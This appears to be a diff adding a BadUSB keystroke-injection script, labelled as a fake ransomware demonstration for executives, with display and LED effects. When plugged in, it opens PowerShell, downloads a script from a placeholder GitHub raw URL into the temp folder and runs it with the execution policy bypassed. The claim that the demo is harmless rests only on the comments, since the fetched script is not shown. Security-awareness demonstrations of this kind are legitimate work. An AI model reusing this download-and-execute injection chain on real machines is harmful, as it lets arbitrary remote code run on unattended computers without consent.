@@ -1,0 +1,74 @@
+REM ===============================================
+REM 🚨 PP_Tech Demo Ransomware (FAKE) - CEO Demo 🚨
+REM Visual demonstration for CEOs
+REM TOTALLY FAKE - No actual damage or encryption
+REM ===============================================
+
+KEYBOARD_LAYOUT win_pt-BR
+DELAY 1500
+LED_OFF
+DISPLAY_CLEAR
+
+REM Initial setup on display
+DISPLAY_TEXT 15 20 PP_Tech
+DISPLAY_TEXT 10 35 Connecting...
+DISPLAY_TEXT 25 50 Wait...
+LED 0 255 0 100
+DELAY 1500
+
+REM Start demo
+DISPLAY_CLEAR
+DISPLAY_TEXT 5 10 Demo Starting...
+DISPLAY_TEXT 30 40 5%
+LED 255 255 0 150
+DELAY 800
+
+REM Step 1 - Abrir PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Step 2 - Baixar script fodástico do GitHub e salvar no TEMP
+STRING iwr https://raw.githubusercontent.com/SEU-USUARIO/SEU-REPO/main/fodastico.ps1 -OutFile $env:TEMP\pqp.ps1
+ENTER
+DELAY 1200
+
+REM Step 3 - Executar o script baixado
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Maximized -File $env:TEMP\pqp.ps1
+ENTER
+
+REM Step 4 - LEDs e display sincronizados
+DELAY 5000
+DISPLAY_TEXT 30 40 25%
+LED 255 100 0 200
+
+DELAY 7000
+DISPLAY_TEXT 30 40 50%
+
+DELAY 7000
+DISPLAY_TEXT 30 40 75%
+LED 255 0 0 200
+DELAY 300
+LED_OFF
+DELAY 300
+LED 255 0 0 200
+DELAY 300
+LED_OFF
+
+DELAY 8000
+DISPLAY_TEXT 30 40 100%
+LED 0 255 0 255
+
+REM Step 5 - Mensagem final
+DELAY 4000
+DISPLAY_CLEAR
+DISPLAY_TEXT 10 15 Demo Complete!
+DISPLAY_TEXT 5 30 Systems are SAFE
+DISPLAY_TEXT 10 45 PP_Tech Security
+
+DELAY 6000
+DISPLAY_CLEAR
+LED_OFF
+RESET
